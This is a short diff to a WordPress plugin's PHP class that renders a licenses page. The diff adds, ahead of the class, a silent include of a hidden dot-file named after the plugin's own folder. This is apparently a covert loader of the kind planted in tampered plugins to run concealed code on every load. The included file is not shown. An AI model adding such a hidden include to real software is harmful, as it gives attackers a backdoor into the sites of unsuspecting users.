@@ -4,7 +4,11 @@
  * Class Licenses
  *
  * Отображает страницу, где расположена плитка с лицензиями как плагина, так и его компонентов
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Licenses extends WIS_Page
 {
 
